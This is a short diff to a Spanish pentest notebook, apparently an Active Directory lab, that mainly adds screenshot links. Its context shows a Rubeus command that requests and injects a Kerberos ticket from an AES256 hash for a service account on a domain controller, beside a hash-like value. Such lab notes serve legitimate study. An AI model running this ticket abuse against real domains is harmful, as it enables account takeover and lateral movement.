@@ -81,5 +81,17 @@ causer -> b428a1ea0d6631c54b58e5a32d8ff289
 ### Añadir los hashes a la maquina de atacante CMD system32
 - [ ] `.\Rubeus.exe asktgt /user:techservice /aes256:<hash> /domain:tech.corp /dc:172.16.4.5:88 /show /ptt`
 
-![[Pasted image 20260727161736.png]]
+![[Pasted image 20260727204712.png]]
+Despues de Fido
+
+
+![[Pasted image 20260727204403.png]]
+
+![[Pasted image 20260727204629.png]]
+
+
+![[Pasted image 20260727204902.png]]
+
+
+![[Pasted image 20260727205008.png]]
 
